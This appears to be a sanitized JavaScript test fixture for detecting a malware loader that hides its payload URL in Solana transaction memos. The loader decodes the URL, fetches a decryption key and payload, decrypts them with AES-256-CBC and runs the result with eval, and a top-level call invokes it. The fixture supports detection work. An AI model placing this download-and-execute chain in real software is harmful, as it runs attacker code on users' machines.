// SANITIZED TEST FIXTURE — reconstructed from public IOCs for detection testing
// Wave 5: Solana RPC Loader (Mar 2026)
// Source: Aikido "GlassWorm Strikes Popular React Native Phone Number Packages"
// Pattern: Solana RPC → base64 memo extraction → URL → fetch secretkey/iv → eval

async function loadSolanaPayload() {
    // Fetch to Solana RPC endpoint with JSON-RPC body
    const rpcEndpoint = 'https://api.mainnet-beta.solana.com';
    const requestBody = {
        jsonrpc: "2.0",
        id: 1,
        method: "getSignaturesForAddress",
        params: [
            "11111111111111111111111111111111", // Sanitized address
            { limit: 1 }
        ]
    };
    
    const response = await fetch(rpcEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestBody)
    });
    
    const result = await response.json();
    
    // Extract base64-encoded memo from response
    if (result.result && result.result[0]) {
        const memoData = result.result[0].memo;
        const decodedMemo = atob(memoData);
        
        // Memo contains URL pointing to attacker infrastructure
        const payloadUrl = decodedMemo.trim();
        
        // Second fetch to that URL returns secretkey and ivbase64
        const payloadResponse = await fetch(payloadUrl);
        const payloadData = await payloadResponse.json();
        
        const secretKey = payloadData.secretkey;
        const ivBase64 = payloadData.ivbase64;
        const encryptedPayload = payloadData.payload;
        
        // Decrypt using AES-256-CBC
        const crypto = require('crypto');
        const key = Buffer.from(secretKey, 'hex');
        const iv = Buffer.from(atob(ivBase64), 'hex');
        
        const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
        let decrypted = decipher.update(encryptedPayload, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        
        // Execute decrypted payload
        eval(decrypted);
    }
}

// Heavy string obfuscation pattern (reconstructed)
// In real attack, function wrappers like e(0x45b, 'nSeb', 0x48f, 0x42b) are used
const stringTable = {
    0x45b: 'fetch',
    0x48f: 'POST',
    0x42b: 'application/json',
    0x1a2: 'eval',
    0x3c4: 'crypto'
};

function getString(idx) {
    return stringTable[idx];
}

loadSolanaPayload();
